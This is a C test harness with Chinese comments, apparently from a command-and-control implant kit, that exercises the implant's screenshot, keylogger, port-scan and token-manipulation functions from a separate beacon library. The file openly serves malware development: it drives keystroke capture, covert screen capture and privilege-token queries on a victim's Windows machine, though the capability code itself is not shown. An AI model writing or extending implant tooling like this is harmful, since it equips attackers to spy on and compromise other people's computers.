/*
 * csdev :: ops_test.c  --  植入体原生能力控制台自测
 * ==========================================================================
 * 用于在不启动完整 C2 链路的前提下验证 GDI 截屏 / 键盘记录 / 端口扫描。
 * 注意: 本程序是开发期工具, 不参与载荷生成。
 *
 * 编译:
 *   gcc -O2 -I..\kits\beacon -o ops_test.exe ops_test.c ..\kits\beacon\beacon2_ops.c
 *
 * 用法:
 *   ops_test.exe shot            截屏并写出 screen_test.bmp
 *   ops_test.exe scan 127.0.0.1 1-1024
 *   ops_test.exe token getuid
 * ==========================================================================
 */
#include <stdio.h>
#include <string.h>
#include <windows.h>

#include "beacon2_ops.h"

int main(int argc, char **argv)
{
    if (argc < 2) {
        printf("usage: ops_test <shot|scan|token|keylog> [args]\n");
        return 1;
    }

    if (strcmp(argv[1], "shot") == 0) {
        unsigned int cap = 48u * 1024u * 1024u;
        unsigned char *buf = (unsigned char *)VirtualAlloc(NULL, cap,
                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        unsigned int n;
        printf("alloc=%p cap=%u\n", (void *)buf, cap);
        fflush(stdout);
        if (!buf) return 2;
        n = ops_screenshot(buf, cap);
        printf("screenshot len = %u\n", n);
        fflush(stdout);
        if (n > 54) {
            FILE *f = fopen("screen_test.bmp", "wb");
            if (f) {
                fwrite(buf, 1, n, f);
                fclose(f);
                printf("wrote screen_test.bmp\n");
            }
            printf("magic=%c%c  header_size=%u  width=%d  height=%d  bpp=%u\n",
                   buf[0], buf[1],
                   (unsigned)(buf[2] | (buf[3] << 8) | (buf[4] << 16) | ((unsigned)buf[5] << 24)),
                   (int)(buf[18] | (buf[19] << 8) | (buf[20] << 16) | ((unsigned)buf[21] << 24)),
                   (int)(buf[22] | (buf[23] << 8) | (buf[24] << 16) | ((unsigned)buf[25] << 24)),
                   (unsigned)(buf[28] | (buf[29] << 8)));
        }
        VirtualFree(buf, 0, MEM_RELEASE);
        return n ? 0 : 3;
    }

    if (strcmp(argv[1], "scan") == 0 && argc >= 4) {
        static unsigned char out[400000];
        unsigned int n = ops_portscan(argv[2], argv[3], 1000, out, sizeof(out) - 1);
        out[n] = 0;
        printf("%s\n", (char *)out);
        return 0;
    }

    if (strcmp(argv[1], "token") == 0) {
        static unsigned char out[400000];
        unsigned int n = ops_token(argc >= 3 ? argv[2] : "getuid",
                                   argc >= 4 ? argv[3] : "", out, sizeof(out) - 1);
        out[n] = 0;
        printf("%s\n", (char *)out);
        return 0;
    }

    if (strcmp(argv[1], "keylog") == 0) {
        static unsigned char out[400000];
        unsigned int n;
        printf("start keylog, 5 秒内请敲键盘 ...\n");
        n = ops_keylog(1, out, sizeof(out) - 1);
        out[n] = 0;
        printf("%s", (char *)out);
        Sleep(5000);
        n = ops_keylog(0, out, sizeof(out) - 1);
        out[n] = 0;
        printf("--- captured ---\n%s\n", (char *)out);
        return 0;
    }

    printf("unknown command\n");
    return 1;
}
